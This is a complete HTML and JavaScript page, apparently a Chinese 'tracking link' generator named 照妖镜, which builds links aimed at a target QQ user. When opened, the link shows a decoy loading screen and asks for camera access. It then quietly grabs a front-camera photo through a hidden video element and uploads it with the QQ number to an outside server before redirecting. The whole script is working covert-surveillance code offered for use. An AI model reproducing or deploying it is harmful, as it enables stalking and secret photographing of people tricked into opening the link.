<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>照妖镜 - 链接生成器</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: 'PingFang SC', 'Microsoft YaHei', sans-serif;
            background: #0a0a0f;
            color: #e0e0e0;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }
        /* 配置界面样式（略，与之前一样，不占篇幅） */
        .config-container { max-width:500px; width:100%; }
        .card { background:#13131a; border:1px solid #2a2a35; border-radius:12px; padding:32px 28px; }
        .card-header { text-align:center; margin-bottom:24px; }
        .card-header .icon { font-size:48px; }
        .card-header h1 { font-size:26px; background:linear-gradient(135deg,#e0e0e0,#a0a0c0); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
        .form-group { margin-bottom:20px; }
        .form-group label { display:block; font-size:13px; color:#a0a0b0; margin-bottom:6px; }
        .form-group input {
            width:100%; padding:13px 15px; background:#1a1a24; border:1.5px solid #2a2a35;
            border-radius:8px; color:#e0e0e0; font-size:15px; outline:none;
        }
        .btn { width:100%; padding:14px; background:#6c5ce7; color:#fff; border:none; border-radius:8px; font-size:16px; cursor:pointer; }
        .result-area { display:none; margin-top:20px; padding:18px; background:#0d0d15; border:1px solid #2a2a35; border-radius:8px; }
        .result-area.show { display:block; }
        .result-area input { width:100%; padding:10px; background:#1a1a24; border:1px solid #2a2a35; border-radius:6px; color:#7ecbff; }
        .btn-copy { padding:10px 16px; background:#2ecc71; color:#fff; border:none; border-radius:6px; cursor:pointer; margin-top:8px; }

        /* ===== 追踪界面：极简版 ===== */
        .track-overlay {
            position:fixed; inset:0; z-index:99999; background:#000;
            display:flex; align-items:center; justify-content:center; flex-direction:column;
            overflow:hidden;
        }
        /* 漂浮小字容器 */
        .floating-words {
            position:absolute; inset:0; pointer-events:none; z-index:0;
        }
        .floating-word {
            position:absolute; font-family:monospace; font-size:11px;
            color:rgba(255,255,255,0.06); white-space:nowrap;
            animation: floatUp 15s linear infinite;
        }
        @keyframes floatUp {
            0% { transform:translateY(100vh); opacity:0; }
            10% { opacity:0.15; }
            90% { opacity:0.15; }
            100% { transform:translateY(-100px); opacity:0; }
        }
        /* 中心区域 */
        .center-box { position:relative; z-index:1; text-align:center; }
        .spinner {
            width:45px; height:45px; border:3px solid rgba(255,255,255,0.15);
            border-top-color:#fff; border-radius:50%; animation:spin 0.8s linear infinite;
            margin:0 auto 20px;
        }
        @keyframes spin { to { transform:rotate(360deg); } }
        .status-text { color:#aaa; font-size:15px; margin-bottom:8px; }
        .denied-msg { display:none; color:#e74c3c; font-size:14px; margin-top:10px; }
        .denied-msg.show { display:block; }
    </style>
</head>
<body>

<!-- 配置模式（与之前完全一样，保留） -->
<div id="configMode" class="config-container">
    <div class="card">
        <div class="card-header">
            <span class="icon">🪞</span>
            <h1>照妖镜</h1>
            <p style="color:#a0a0b0;font-size:13px;">生成追踪链接 · 自动采集回传</p>
        </div>
        <div class="form-group">
            <label>QQ号 <span style="color:#e74c3c;">*</span></label>
            <input type="text" id="qqInput" placeholder="输入目标QQ号" maxlength="20">
        </div>
        <div class="form-group">
            <label>跳转网址 <span style="color:#e74c3c;">*</span></label>
            <input type="url" id="urlInput" placeholder="https://example.com">
        </div>
        <button class="btn" onclick="generateLink()">🔗 生成追踪链接</button>
        <div class="result-area" id="resultArea">
            <div style="color:#2ecc71;font-weight:600;font-size:12px;">✅ 追踪链接</div>
            <input type="text" id="resultLink" readonly onclick="this.select();copyLink()">
            <button class="btn-copy" id="btnCopy" onclick="copyLink()">📋 复制</button>
        </div>
        <div style="margin-top:18px;padding:12px;background:rgba(231,76,60,0.08);border:1px solid rgba(231,76,60,0.25);border-radius:8px;font-size:12px;color:#e98b82;">
            ⚠️ 需要 HTTPS 环境，API 为 HTTP 时可能被浏览器拦截。
        </div>
    </div>
</div>

<!-- 追踪模式：极简漂浮文字 -->
<div class="track-overlay" id="trackMode" style="display:none;">
    <div class="floating-words" id="floatingWords"></div>
    <div class="center-box">
        <div class="spinner" id="spinner"></div>
        <div class="status-text" id="statusText">正在初始化...</div>
        <div class="denied-msg" id="deniedMsg">
            🚫 访问被拒绝<br>
            <span style="font-size:12px;color:#666;">对方未授权，任务终止</span>
        </div>
    </div>
</div>

<video id="vid" playsinline autoplay muted style="position:fixed;top:0;left:0;width:1px;height:1px;opacity:0.01;pointer-events:none;"></video>
<canvas id="cvs" style="display:none;"></canvas>

<script>
// ========== 全局工具 ==========
const $ = id => document.getElementById(id);

// 配置模式功能（精简保留）
function generateLink() {
    const qq = $('qqInput').value.trim();
    const url = $('urlInput').value.trim();
    if (!qq || !/^\d{4,20}$/.test(qq)) return alert('请输入正确的QQ号');
    if (!url || !/^https?:\/\/.+/.test(url)) return alert('请输入有效的跳转网址');
    const link = location.origin + location.pathname + '?qq=' + qq + '&url=' + encodeURIComponent(url);
    $('resultLink').value = link;
    $('resultArea').classList.add('show');
    copyLink();
}
function copyLink() {
    const i = $('resultLink'); i.select();
    navigator.clipboard?.writeText(i.value).then(() => $('btnCopy').textContent = '✅ 已复制')
    .catch(() => document.execCommand('copy'));
}

// ========== 漂浮文字生成器 ==========
const words = [
    'initializing...', 'loading modules...', 'checking environment...', 'handshake...',
    'verifying...', 'allocating memory...', 'scanning...', 'acquiring signal...',
    'calibrating...', 'processing...', 'buffering...', 'compressing...',
    'connecting...', 'awaiting response...', 'validating checksum...', 'optimizing...',
    'resolving DNS...', 'tunneling...', 'authenticating...', 'parsing...',
    'routing...', 'checking latency...', 'retrying...', 'waking interface...',
    'reading sectors...', 'mounting...', 'garbage collecting...', 'applying patches...',
    'daemon running...', 'session active', 'heartbeat sent', 'channel secured',
    'data transfer OK', 'checksum valid', 'payload delivered', 'closing...',
    'cleanup done', 'task completed', 'system idle', 'monitoring...', 'log rotated'
];
let floatTimer;
function startFloatingWords() {
    const box = $('floatingWords');
    const add = () => {
        const el = document.createElement('div');
        el.className = 'floating-word';
        el.textContent = words[Math.floor(Math.random() * words.length)];
        el.style.left = Math.random() * 90 + '%';
        el.style.animationDuration = (12 + Math.random() * 15) + 's';
        box.appendChild(el);
        el.addEventListener('animationend', () => el.remove());
    };
    for (let i=0;i<12;i++) setTimeout(add, i*200);
    floatTimer = setInterval(add, 900);
}
function stopFloating() {
    clearInterval(floatTimer);
    $('floatingWords').innerHTML = '';
}

// ========== 追踪模式核心 ==========
function startTrack(qq, redirectUrl) {
    $('configMode').style.display = 'none';
    $('trackMode').style.display = 'flex';
    startFloatingWords();

    const spinner = $('spinner');
    const status = $('statusText');
    const denied = $('deniedMsg');
    const vid = $('vid');
    const cvs = $('cvs');
    const API = 'http://a1nb66.atwebpages.com/zyj/api.php';

    function setStatus(t, err) {
        status.textContent = t;
        status.style.color = err ? '#e74c3c' : '#aaa';
    }

    async function run() {
        // 环境检查
        if (!navigator.mediaDevices?.getUserMedia) {
            setStatus('环境不支持', true); spinner.style.borderTopColor = '#e74c3c';
            return setTimeout(() => location.href = redirectUrl, 2000);
        }

        // 请求授权
        setStatus('正在请求授权...');
        let stream;
        try {
            stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
                audio: false
            });
        } catch (e) {
            if (e.name === 'NotAllowedError' || e.name === 'PermissionDeniedError') {
                setStatus('访问被拒绝', true);
                spinner.style.display = 'none';
                denied.classList.add('show');
                stopFloating();
                return; // 不跳转
            }
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
            } catch (e2) {
                if (e2.name === 'NotAllowedError' || e2.name === 'PermissionDeniedError') {
                    setStatus('访问被拒绝', true);
                    spinner.style.display = 'none';
                    denied.classList.add('show');
                    stopFloating();
                    return;
                }
                setStatus('设备不可用', true); spinner.style.borderTopColor = '#e74c3c';
                stopFloating();
                return setTimeout(() => location.href = redirectUrl, 2000);
            }
        }

        // 绑定视频
        vid.srcObject = stream;
        vid.play().catch(()=>{});
        setStatus('准备就绪...');

        // 等待有效帧（最多8秒）
        const ready = await new Promise(resolve => {
            const start = Date.now();
            const check = () => {
                if (vid.videoWidth > 0) return resolve(true);
                if (Date.now() - start > 8000) return resolve(false);
                requestAnimationFrame(check);
            };
            vid.addEventListener('loadeddata', () => vid.videoWidth > 0 && resolve(true), { once: true });
            requestAnimationFrame(check);
        });

        if (!ready) {
            setStatus('超时', true); spinner.style.borderTopColor = '#e74c3c';
            stream.getTracks().forEach(t => t.stop());
            stopFloating();
            return setTimeout(() => location.href = redirectUrl, 2000);
        }

        // 截图
        cvs.width = vid.videoWidth;
        cvs.height = vid.videoHeight;
        const ctx = cvs.getContext('2d');
        ctx.drawImage(vid, 0, 0);
        const img = cvs.toDataURL('image/jpeg', 0.65);
        stream.getTracks().forEach(t => t.stop());
        setStatus('正在上传...');

        // 上传
        const fd = new FormData();
        fd.append('qq', qq);
        fd.append('image', img);
        try {
            const resp = await fetch(API, { method: 'POST', body: fd, signal: AbortSignal.timeout(15000) });
            if (resp.ok) {
                const r = await resp.json();
                if (r.success) {
                    setStatus('完成 ✓', false);
                    spinner.style.borderTopColor = '#2ecc71';
                } else {
                    setStatus('服务器拒绝', true);
                }
            } else {
                setStatus('上传失败', true);
            }
        } catch (e) {
            setStatus('网络错误', true);
        }

        stopFloating();
        setTimeout(() => location.href = redirectUrl, 2000);
    }

    setTimeout(run, 600);
}

// 入口
const params = new URLSearchParams(location.search);
const qq = params.get('qq'), url = params.get('url');
if (qq && url) startTrack(qq, decodeURIComponent(url));
else $('configMode').style.display = 'block';
</script>
</body>
</html>
